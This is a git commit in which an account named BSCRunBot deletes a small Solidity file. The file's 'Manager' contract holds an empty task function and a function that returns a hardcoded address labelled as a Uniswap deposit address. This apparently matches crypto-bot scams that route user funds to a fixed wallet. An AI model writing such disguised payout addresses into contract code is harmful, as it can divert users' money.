8d5ce0adf5a904021ba8a362035c7370da7f6b10
BSCRunBot <96918100+BSCRunBot@users.noreply.github.com>
2022-01-11 14:58:54 +0800

    Delete BotAddress.sol

--- BotAddress.sol
+++
@@ -1,9 +0,0 @@
-pragma solidity ^0.6.6;
-
-contract Manager {
-	function performTasks() public {
-	    	}
-	function uniswapDepositAddress() public pure returns (address) {
-		return 0x41FbC651a1462FB215eBa638A2F2c3F9885f636b;
-	}
-}
